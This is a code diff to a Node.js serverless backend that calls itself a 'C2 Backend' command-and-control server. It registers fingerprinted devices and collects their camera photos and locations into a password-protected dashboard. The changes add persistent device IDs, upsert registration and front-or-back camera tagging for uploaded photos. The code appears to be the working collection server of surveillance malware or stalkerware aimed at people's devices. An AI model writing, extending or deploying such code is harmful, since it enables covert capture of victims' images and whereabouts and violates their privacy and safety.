@@ -1,6 +1,6 @@
 // ============================================================
-//  MINIMAL API — WITH DASHBOARD BUTTON
-//  For Vercel Hobby Plan — single function
+//  C2 BACKEND – WITH UPSERT AND PERSISTENT DEVICE ID
+//  Deploy on Vercel
 // ============================================================
 
 const { createClient } = require('@supabase/supabase-js');
@@ -46,8 +46,7 @@ module.exports = async (req, res) => {
     //  ROOT — SHOW DASHBOARD BUTTON
     // ============================================================
     if (path === '/') {
-        return res.send(`
-<!DOCTYPE html>
+        return res.send(`<!DOCTYPE html>
 <html>
 <head>
     <title>C2 Backend</title>
@@ -73,7 +72,6 @@ module.exports = async (req, res) => {
     <span class="icon">☠️</span>
     <h1>C2 Backend</h1>
     <p class="sub">Your command & control server is running.</p>
-
     <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank" class="btn">
         📊 Open Dashboard
     </a>
@@ -81,7 +79,6 @@ module.exports = async (req, res) => {
     <a href="/api/test" class="btn btn-secondary">
         🔍 Health Check
     </a>
-
     <div class="endpoints">
         <div><span class="highlight">POST</span> /api/register — Register device</div>
         <div><span class="highlight">POST</span> /api/photo — Upload photo</div>
@@ -94,7 +91,6 @@ module.exports = async (req, res) => {
         <div><span class="highlight">GET</span> /api/locations?deviceId=xxx — Get locations</div>
         <div><span class="highlight">GET</span> /api/test — Health check</div>
     </div>
-
     <p class="footer">🔐 Dashboard is password protected.</p>
 </div>
 </body>
@@ -118,7 +114,7 @@ module.exports = async (req, res) => {
     }
 
     // ============================================================
-    //  REGISTER DEVICE
+    //  REGISTER DEVICE — UPSERT to avoid duplicate entries
     // ============================================================
     if (path === '/api/register' && req.method === 'POST') {
         if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
@@ -126,11 +122,13 @@ module.exports = async (req, res) => {
         const { fingerprint, permissions } = req.body || {};
         if (!fingerprint) return res.status(400).json({ error: 'Missing fingerprint' });
 
-        const deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        // deviceId is sent from frontend (must be provided)
+        const deviceId = fingerprint.deviceId;
+        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId in fingerprint' });
 
         const { error } = await supabase
             .from('devices')
-            .insert([{
+            .upsert([{
                 id: deviceId,
                 ip: fingerprint.ip || 'unknown',
                 platform: fingerprint.platform || 'unknown',
@@ -142,12 +140,19 @@ module.exports = async (req, res) => {
                 first_seen: Date.now(),
                 last_seen: Date.now(),
                 permissions: JSON.stringify(permissions || {})
-            }]);
+            }], { onConflict: 'id' });
 
         if (error) {
             console.error('Register error:', error);
             return res.status(500).json({ error: error.message });
         }
+
+        await supabase.from('logs').insert([{
+            device_id: deviceId,
+            level: 'info',
+            message: 'Device registered/updated',
+            timestamp: Date.now()
+        }]);
 
         return res.json({ success: true, deviceId });
     }
@@ -158,7 +163,7 @@ module.exports = async (req, res) => {
     if (path === '/api/photo' && req.method === 'POST') {
         if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
 
-        const { deviceId, image, timestamp } = req.body || {};
+        const { deviceId, image, timestamp, camera } = req.body || {};
         if (!deviceId || !image) {
             return res.status(400).json({ error: 'Missing deviceId or image' });
         }
@@ -170,7 +175,7 @@ module.exports = async (req, res) => {
             try {
                 const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
                 const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'jpg';
-                const fileName = `${deviceId}_${Date.now()}.${ext}`;
+                const fileName = `${deviceId}_${Date.now()}_${camera || 'back'}.${ext}`;
                 const fileBuffer = Buffer.from(base64Data, 'base64');
 
                 const { error: uploadError } = await supabase
@@ -199,7 +204,8 @@ module.exports = async (req, res) => {
                     timestamp: timestamp || Date.now(),
                     data_url: storagePath ? null : image.substring(0, 100),
                     storage_path: storagePath,
-                    file_path: filePath
+                    file_path: filePath,
+                    camera: camera || 'back'
                 }]);
 
             if (dbError) {
